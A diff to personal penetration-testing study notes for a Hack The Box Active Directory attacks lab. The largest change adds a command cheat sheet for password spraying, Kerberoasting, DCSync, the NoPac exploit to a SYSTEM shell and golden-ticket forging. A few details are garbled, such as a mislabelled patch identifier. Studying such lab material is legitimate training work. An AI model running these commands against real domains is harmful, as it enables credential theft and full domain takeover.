@@ -2,7 +2,7 @@
 
 #ActiveDirectory #ADEnum #ADAttacks #Kerberoasting #ASREPRoasting #ACLAbuse #DCSync #DomainTrusts #Inveigh #DomainPasswordSpray #NoPac #BloodHound #PowerView #LivingOffTheLand #ExtraSids #CrossForest #raiseChild #HTBSupplementary
 
-**HTB Active Directory Enumeration & Attacks module** — the largest standalone HTB AD module. Covers the full attack lifecycle from external recon through cross-forest trust abuse. This note documents only content NOT already in the vault. Techniques already covered are listed below and skipped here.
+**HTB Active Directory Enumeration & Attacks module**, the largest standalone HTB AD module. Covers the full attack lifecycle from external recon through cross-forest trust abuse. This note documents only content NOT already in the vault. Techniques already covered are listed below and skipped here.
 
 > 🔁 Cross-refs: [[Password Attacks]] (Responder LLMNR basics, NTLMv2 hashcat -m 5600), [[Password Attacks (HTB Supplementary)]] (kerbrute, username-anarchy, Snaffler basics, PtH, PtT, PtC, VSS NTDS dump), [[Active Directory Methodology]] (password spray, AS-REP roast, Kerberoasting, DCSync, BloodHound import, Golden Ticket), [[Footprinting#FP.8. MSSQL|FP.8]] (xp_cmdshell, mssqlclient basics), [[Attacking Common Services (HTB Supplementary)]] (MSSQL impersonation, linked server attacks), [[Pivoting, Tunneling, and Port Forwarding (HTB Supplementary)]] (autoroute, Meterpreter SOCKS), [[Windows Privilege Escalation]] (SeImpersonatePrivilege), [[MODERN TOOLING/Kerbrute|Kerbrute]], [[MODERN TOOLING/Snaffler|Snaffler]], [[MODERN TOOLING/SigmaPotato|SigmaPotato]]
 
@@ -79,7 +79,7 @@ awk '/1433\/open/ {print $2}' mssql_scan.txt
 
 The `awk` pattern `/1433\/open/` matches lines containing that string; `{print $2}` outputs the IP field (column 2 in grepable format).
 
-> 🔁 Similar to: [[Information Gathering#nmap grepable output|nmap -oG]] — same `-oG` format, different field being parsed.
+> 🔁 Similar to: [[Information Gathering#nmap grepable output|nmap -oG]], same `-oG` format, different field being parsed.
 
 #### Tags: #nmap #SSL #TLSCert #FQDN #awk #GrepableNmap #InitialEnum
 
@@ -89,7 +89,7 @@ The `awk` pattern `/1433\/open/` matches lines containing that string; `{print $
 
 Responder runs from Linux. When you already have a Windows foothold and want to poison LLMNR/NBT-NS from that machine, **Inveigh** is the PowerShell equivalent.
 
-> 🔁 Similar to: Module 16 Responder — same attack, different platform. Inveigh is the Windows-native version of Responder.
+> 🔁 Similar to: Module 16 Responder, same attack, different platform. Inveigh is the Windows-native version of Responder.
 
 ```powershell
 # Import the module (download from https://github.com/Kevin-Robertson/Inveigh)
@@ -125,7 +125,7 @@ There's also a C# version (`InveighZero`) that runs as a compiled binary and is 
 
 ## AD.4. Password Policy Enumeration
 
-Knowing the lockout threshold and minimum password length is critical before spraying. Default Windows domain password policy has a **minimum length of 7** (not 8 — the 8+ requirement is a common CIS hardening recommendation, not the default).
+Knowing the lockout threshold and minimum password length is critical before spraying. Default Windows domain password policy has a **minimum length of 7** (not 8, the 8+ requirement is a common CIS hardening recommendation, not the default).
 
 ```bash
 # From Linux (unauthenticated, if null session allowed):
@@ -150,7 +150,7 @@ Get-DomainPolicy
 # minPwdLength = 8
 ```
 
-> 🔍 Worth remembering generally: the default Windows domain policy minimum password length is 7. If you see 7, it means no custom policy has been applied — easier for your spray candidates. An 8-char minimum usually means CIS hardening. A lockout threshold of 0 means no lockout at all (spray freely). Threshold of 5 means stop at 3-4 attempts per account to stay safe.
+> 🔍 Worth remembering generally: the default Windows domain policy minimum password length is 7. If you see 7, it means no custom policy has been applied, easier for your spray candidates. An 8-char minimum usually means CIS hardening. A lockout threshold of 0 means no lockout at all (spray freely). Threshold of 5 means stop at 3-4 attempts per account to stay safe.
 
 #### Tags: #PasswordPolicy #minPwdLength #enum4linux #crackmapexec #rpcclient #getdompwinfo
 
@@ -248,7 +248,7 @@ Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v data
 
 > 📸 Screenshot: Snaffler output with {Red} or {Green} credential hits from domain shares
 
-> 🔁 Similar to: [[Password Attacks (HTB Supplementary)#PA.17.4. Snaffler — Automated Interesting-File Finder|PA.17.4]] per-host variant. Add `-d` to go domain-wide.
+> 🔁 Similar to: [[Password Attacks (HTB Supplementary)#PA.17.4. Snaffler. Automated Interesting-File Finder|PA.17.4]] per-host variant. Add `-d` to go domain-wide.
 
 ### AD.7.3. PowerView — Full Enumeration Toolkit
 
@@ -614,9 +614,9 @@ python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 \
 # Spawns a semi-interactive shell running as NT AUTHORITY\SYSTEM on the DC
 ```
 
-> 🔧 Technique: NoPac creates a machine account (any domain user can create up to 10 by default — the `MachineAccountQuota`), renames its `sAMAccountName` to match a DC, requests a TGT under that name, then renames back before requesting a TGS. The KDC looks up the TGS target, doesn't find the renamed account, appends `$` and finds the real DC — issuing a PAC claiming DC privileges. Patched in MS21-42278 (November 2021 patch).
+> 🔧 Technique: NoPac creates a machine account (any domain user can create up to 10 by default, the `MachineAccountQuota`), renames its `sAMAccountName` to match a DC, requests a TGT under that name, then renames back before requesting a TGS. The KDC looks up the TGS target, doesn't find the renamed account, appends `$` and finds the real DC, issuing a PAC claiming DC privileges. Patched in MS21-42278 (November 2021 patch).
 
-> 🔍 Worth remembering generally: this works even on fully patched targets if the November 2021 patch wasn't applied. Always check with the scanner first — if `Got TGT with PAC` appears, you're golden. The exploit is noisy (creates a machine account) so clean up afterwards in real engagements.
+> 🔍 Worth remembering generally: this works even on fully patched targets if the November 2021 patch wasn't applied. Always check with the scanner first, if `Got TGT with PAC` appears, you're golden. The exploit is noisy (creates a machine account) so clean up afterwards in real engagements.
 
 > 📸 Screenshot: noPac scanner confirming vulnerability, then shell showing `whoami = NT AUTHORITY\SYSTEM`
 
@@ -639,7 +639,7 @@ Get-DomainUser -UACFilter PASSWD_NOTREQD | select samaccountname, useraccountcon
 crackmapexec smb <DC_IP> -u ygroce -p ''
 ```
 
-> 🔍 Worth remembering generally: `PASSWD_NOTREQD` doesn't mean the account definitely has a blank password — it just means Windows allows it. The account might still have a password set. Try blank first, then spray.
+> 🔍 Worth remembering generally: `PASSWD_NOTREQD` doesn't mean the account definitely has a blank password, it just means Windows allows it. The account might still have a password set. Try blank first, then spray.
 
 ### AD.14.2. AS-REP Roasting with Rubeus (format:hashcat)
 
@@ -759,7 +759,7 @@ ls \\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\c$
 rem → Success → f@ll1ng_l1k3_d0m1no3$
 ```
 
-> 🔍 Worth remembering generally: the ExtraSids attack works because WITHIN_FOREST trusts don't filter SID history. The `SID filtering` that would block this only applies to FOREST_TRANSITIVE (cross-forest) trusts. This is a design decision — Microsoft accepts this risk for within-forest trusts. SID filtering can be enabled within a forest (hardening) but rarely is.
+> 🔍 Worth remembering generally: the ExtraSids attack works because WITHIN_FOREST trusts don't filter SID history. The `SID filtering` that would block this only applies to FOREST_TRANSITIVE (cross-forest) trusts. This is a design decision. Microsoft accepts this risk for within-forest trusts. SID filtering can be enabled within a forest (hardening) but rarely is.
 
 > 📸 Screenshot: Rubeus golden output → klist showing injected ticket → successful ls of parent DC C$
 
@@ -824,7 +824,7 @@ smbexec.py freightlogistics.local/sapsso:pabloPICASSO@172.16.5.238
 # → cat /c/Users/Administrator/Desktop/flag.txt → burn1ng_d0wn_th3_f0rest!
 ```
 
-> 🔍 Worth remembering generally: `smbexec.py` is different from `psexec.py` and `wmiexec.py`. It creates a temporary service on the target for each command and deletes it immediately — leaving a smaller footprint than psexec's service-based approach, but still generates service creation events (EventID 7045). Use when psexec fails due to AV or write permission restrictions.
+> 🔍 Worth remembering generally: `smbexec.py` is different from `psexec.py` and `wmiexec.py`. It creates a temporary service on the target for each command and deletes it immediately, leaving a smaller footprint than psexec's service-based approach, but still generates service creation events (EventID 7045). Use when psexec fails due to AV or write permission restrictions.
 
 #### Tags: #CrossForestLinux #GetUserSPNs #targetDomain #smbexec #impacket
 
@@ -1024,28 +1024,28 @@ Domain: INLANEFREIGHT.LOCAL, DC: 172.16.5.5
 
 ## Outstanding Sections
 
-- [x] AD.1 External Recon — DNS TXT records, nslookup TXT query
-- [x] AD.2 Initial Domain Enumeration — nmap SSL commonName, awk grepable parsing
-- [x] AD.3 LLMNR from Windows — Inveigh full workflow
-- [x] AD.4 Password Policy Enumeration — default minPwdLength 7, tools
-- [x] AD.5 Password Spraying from Windows — DomainPasswordSpray.ps1
-- [x] AD.6 Credentialed Enum Linux — rpcclient queryuser RID, CME --groups membercount
-- [x] AD.7 Credentialed Enum Windows — bloodhound-python, Snaffler domain-wide, PowerView extras, setspn.exe
-- [x] AD.8 Living Off the Land — Get-MpComputerStatus, net localgroup, dsquery LDAP filter
-- [x] AD.9 ACL Enumeration — DACL/SACL, ACE types, Get-DomainObjectACL ResolveGUIDs, rights GUIDs
-- [x] AD.10 ACL Abuse Chain — wley → damundsen → Help Desk L1 → adunn → targeted Kerberoast
-- [x] AD.11 DCSync extras — ENCRYPTED_TEXT_PWD_ALLOWED, runas /netonly
-- [x] AD.12 Privileged Access — BloodHound Cypher CanPSRemote/SQLAdmin, mssqlclient -windows-auth
-- [x] AD.13 NoPac (CVE-2021-42278/42287) — scanner + shell workflow
-- [x] AD.14 Misc Misconfigs — PASSWD_NOTREQD hunting, Rubeus asreproast /format:hashcat
-- [x] AD.15 Domain Trusts — trust types table, Get-DomainTrustMapping, netdom
-- [x] AD.16 Child→Parent Windows — ExtraSids Golden Ticket full chain
-- [x] AD.17 Child→Parent Linux — raiseChild.py automated chain
-- [x] AD.18 Cross-Forest Windows — Rubeus kerberoast /domain: /rc4opsec
-- [x] AD.19 Cross-Forest Linux — GetUserSPNs.py -target-domain, smbexec.py
-- [x] AD.20 Additional AD Auditing — PingCastle, Adalanche, ADRecon
-- [x] AD.21 Skills Assessment I — Meterpreter pivot → Kerberoast → LSA → DCSync chain
-- [x] AD.22 Skills Assessment II — Responder → spray → Snaffler → SQL → PrintSpoofer → Inveigh → ACL → DCSync
+- [x] AD.1 External Recon. DNS TXT records, nslookup TXT query
+- [x] AD.2 Initial Domain Enumeration, nmap SSL commonName, awk grepable parsing
+- [x] AD.3 LLMNR from Windows. Inveigh full workflow
+- [x] AD.4 Password Policy Enumeration, default minPwdLength 7, tools
+- [x] AD.5 Password Spraying from Windows. DomainPasswordSpray.ps1
+- [x] AD.6 Credentialed Enum Linux, rpcclient queryuser RID, CME --groups membercount
+- [x] AD.7 Credentialed Enum Windows, bloodhound-python, Snaffler domain-wide, PowerView extras, setspn.exe
+- [x] AD.8 Living Off the Land. Get-MpComputerStatus, net localgroup, dsquery LDAP filter
+- [x] AD.9 ACL Enumeration. DACL/SACL, ACE types, Get-DomainObjectACL ResolveGUIDs, rights GUIDs
+- [x] AD.10 ACL Abuse Chain, wley → damundsen → Help Desk L1 → adunn → targeted Kerberoast
+- [x] AD.11 DCSync extras. ENCRYPTED_TEXT_PWD_ALLOWED, runas /netonly
+- [x] AD.12 Privileged Access. BloodHound Cypher CanPSRemote/SQLAdmin, mssqlclient -windows-auth
+- [x] AD.13 NoPac (CVE-2021-42278/42287), scanner + shell workflow
+- [x] AD.14 Misc Misconfigs. PASSWD_NOTREQD hunting, Rubeus asreproast /format:hashcat
+- [x] AD.15 Domain Trusts, trust types table, Get-DomainTrustMapping, netdom
+- [x] AD.16 Child→Parent Windows. ExtraSids Golden Ticket full chain
+- [x] AD.17 Child→Parent Linux, raiseChild.py automated chain
+- [x] AD.18 Cross-Forest Windows. Rubeus kerberoast /domain: /rc4opsec
+- [x] AD.19 Cross-Forest Linux. GetUserSPNs.py -target-domain, smbexec.py
+- [x] AD.20 Additional AD Auditing. PingCastle, Adalanche, ADRecon
+- [x] AD.21 Skills Assessment I. Meterpreter pivot → Kerberoast → LSA → DCSync chain
+- [x] AD.22 Skills Assessment II. Responder → spray → Snaffler → SQL → PrintSpoofer → Inveigh → ACL → DCSync
 - [x] AD.23 All 55 Q&A answers
 
 ---
@@ -1062,3 +1062,196 @@ Domain: INLANEFREIGHT.LOCAL, DC: 172.16.5.5
 - **[Hybrid](https://www.hackthebox.com/machines/hybrid)** (HTB, Windows, Insane): NoPac-style machine account abuse + ADCS. Extends AD.13 NoPac into a more complex chain.
 
 > 🔍 Worth remembering generally: NoPac and ExtraSids techniques are patched on modern systems but still appear in exam/CTF scenarios on older OS versions. For PG Practice boxes, look at Nagoya (OSCP-like, child→parent trust abuse) if available. Public AD boxes requiring trust attacks are rare because HTB/THM usually keep environments single-domain for simplicity.
+
+
+---
+
+## HTB Module Quick Reference
+
+Commands formatted for use with the [[Pre-Engagement Kali Setup]] variable block.
+
+```bash
+# ============================================================
+# INITIAL RECON (unauthenticated)
+# ============================================================
+# Network sweep
+fping -asgq $Domain/23
+sudo nmap -v -A -iL hosts.txt -oN nmap/ad-hosts.txt
+
+# Username enumeration via Kerberos (no lockout risk)
+kerbrute userenum -d $Domain --dc $DCip /opt/jsmith.txt -o loot/kerbrute-users.txt
+
+# LLMNR/NBT-NS poisoning (run in background — catch hashes)
+sudo responder -I tun0 -wf -v
+# Windows pivot equivalent:
+Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
+
+# Crack NTLMv2 hashes from Responder
+hashcat -m 5600 loot/ntlmv2.hashes /usr/share/wordlists/rockyou.txt
+
+# ============================================================
+# PASSWORD POLICY ENUMERATION (before spraying)
+# ============================================================
+# Null session (no creds needed)
+rpcclient -U "" -N $DCip -c "querydominfo"
+enum4linux-ng -P $DCip -oA loot/ilfreight
+
+# With credentials
+crackmapexec smb $DCip -u $Username -p $Password --pass-pol
+ldapsearch -h $DCip -x -b "DC=${Domain//./,DC=}" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
+
+# ============================================================
+# USER ENUMERATION
+# ============================================================
+crackmapexec smb $DCip -u $Username -p $Password --users
+enum4linux -U $DCip | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
+./windapsearch.py --dc-ip $DCip -u "" -U   # null-session user enum
+
+# ============================================================
+# PASSWORD SPRAYING
+# ============================================================
+# kerbrute (fast, Kerberos-based, no lockout if below threshold)
+kerbrute passwordspray -d $Domain --dc $DCip loot/users.txt $Password
+
+# CrackMapExec (SMB-based spray — check lockout policy first)
+crackmapexec smb $DCip -u loot/users.txt -p $Password | grep "+"
+
+# rpcclient one-liner spray
+for u in $(cat loot/users.txt); do
+  rpcclient -U "$u%$Password" -c "getusername;quit" $DCip | grep Authority
+done
+
+# DomainPasswordSpray.ps1 (from Windows — respects lockout policy automatically)
+Invoke-DomainPasswordSpray -Password $Password -OutFile loot/spray_success.txt -ErrorAction SilentlyContinue
+
+# ============================================================
+# SECURITY CONTROLS CHECK (once on a Windows host)
+# ============================================================
+Get-MpComputerStatus                                                      # Defender status
+Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections   # AppLocker
+$ExecutionContext.SessionState.LanguageMode                               # PS language mode
+Find-LAPSDelegatedGroups                                                  # LAPS groups
+
+# ============================================================
+# CREDENTIALED ENUMERATION (Linux tools)
+# ============================================================
+# BloodHound Python collection (all methods)
+bloodhound-python -d $Domain -u $Username -p $Password -ns $DCip -c all
+zip -r loot/bh_$(date +%s).zip *.json && mv *.json loot/
+
+# CME share and group enum
+crackmapexec smb $DCip -u $Username -p $Password --shares
+crackmapexec smb $DCip -u $Username -p $Password --groups
+crackmapexec smb $DCip -u $Username -p $Password --loggedon-users
+smbmap -u $Username -p $Password -d $Domain -H $DCip -R SYSVOL --dir-only
+
+# GPP cPassword hunt
+crackmapexec smb $DCip -u $Username -p $Password -M gpp_autologin
+gpp-decrypt <VPe/o9YRyz...>   # decrypt a captured GPP password
+
+# Snaffler — credential hunt on shares (from Windows)
+.\Snaffler.exe -d $Domain -s -v data
+
+# ============================================================
+# CREDENTIALED ENUMERATION (PowerView)
+# ============================================================
+Import-Module .\PowerView.ps1
+
+Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName   # Kerberoastable
+Get-DomainUser -PreauthNotRequired | select samaccountname             # AS-REP roastable
+Get-DomainGroupMember -Identity "Domain Admins" -Recurse               # DA membership
+Get-DomainTrustMapping                                                 # full trust map
+Find-DomainShare                                                       # reachable shares
+Find-LocalAdminAccess                                                  # where we have local admin
+
+# ============================================================
+# KERBEROASTING
+# ============================================================
+# From Linux:
+GetUserSPNs.py -dc-ip $DCip $Domain/$Username:$Password -request -outputfile loot/kerberoast.hashes
+hashcat -m 13100 loot/kerberoast.hashes /usr/share/wordlists/rockyou.txt
+
+# From Windows (Rubeus):
+.\Rubeus.exe kerberoast /stats
+.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
+.\Rubeus.exe kerberoast /user:testspn /nowrap
+
+# Targeted Kerberoast (after setting a fake SPN via ACL abuse):
+Set-DomainObject -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'}
+.\Rubeus.exe kerberoast /user:adunn /nowrap
+Set-DomainObject -Identity adunn -Clear serviceprincipalname   # cleanup
+
+# ============================================================
+# AS-REP ROASTING
+# ============================================================
+# From Linux:
+GetNPUsers.py -dc-ip $DCip -outputfile loot/asrep.hashes $Domain/$Username:$Password
+hashcat -m 18200 loot/asrep.hashes /usr/share/wordlists/rockyou.txt
+
+# From Windows:
+.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
+
+# ============================================================
+# ACL ENUMERATION & ABUSE
+# ============================================================
+# Find ACLs owned by our user
+$sid = Convert-NameToSid $Username
+Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
+
+# ForceChangePassword (we have this right over targetuser)
+$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
+Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred
+
+# GenericWrite → add user to group
+Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred
+Remove-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred   # cleanup
+
+# ============================================================
+# DCSYNC
+# ============================================================
+# From Linux (needs DS-Replication rights):
+impacket-secretsdump -just-dc $Domain/$Username:$Password@$DCip
+
+# From Windows (Mimikatz):
+mimikatz # lsadump::dcsync /domain:$Domain /user:$Domain\administrator
+mimikatz # lsadump::dcsync /user:$Domain\krbtgt
+
+# ============================================================
+# NOPAC (CVE-2021-42278 / 42287)
+# ============================================================
+# Check:
+python3 scanner.py $Domain/$Username:$Password -dc-ip $DCip -use-ldap
+# Exploit → SYSTEM shell:
+python3 noPac.py $Domain/$Username:$Password -dc-ip $DCip -dc-host DC01 -shell --impersonate administrator -use-ldap
+# Exploit → DCSync:
+python3 noPac.py $Domain/$Username:$Password -dc-ip $DCip -dc-host DC01 --impersonate administrator -use-ldap -dump -just-dc-user $Domain/administrator
+
+# ============================================================
+# CHILD → PARENT TRUST (EXTRASIDS)
+# ============================================================
+# Get child domain KRBTGT hash:
+impacket-secretsdump -just-dc-user LOGISTICS/krbtgt logistics.$Domain/$Username:$Password@$DCip
+
+# Get SIDs:
+Get-DomainSID                              # child domain SID
+lookupsid.py $Domain/$Username:$Password@$DCip | grep "Domain SID"
+lookupsid.py $Domain/$Username:$Password@$DCip | grep -B12 "Enterprise Admins"   # EA SID
+
+# Forge ExtraSids golden ticket (Linux):
+ticketer.py -nthash <krbtgt_hash> -domain child.$Domain -domain-sid <child_SID> -extra-sid <EA_SID> hacker
+export KRB5CCNAME=hacker.ccache
+psexec.py child.$Domain/hacker@$DCip -k -no-pass -target-ip $DCip   # DC shell
+
+# ExtraSids golden ticket (Mimikatz / Rubeus):
+# mimikatz # kerberos::golden /user:hacker /domain:child.$Domain /sid:<child_SID> /krbtgt:<hash> /sids:<EA_SID> /ptt
+# .\Rubeus.exe golden /rc4:<hash> /domain:child.$Domain /sid:<child_SID> /sids:<EA_SID> /user:hacker /ptt
+
+# Automated child→parent escalation:
+raiseChild.py -target-exec $DCip child.$Domain/$Username:$Password
+
+# ============================================================
+# CROSS-FOREST KERBEROASTING
+# ============================================================
+GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL $Domain/$Username:$Password
+.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
+```
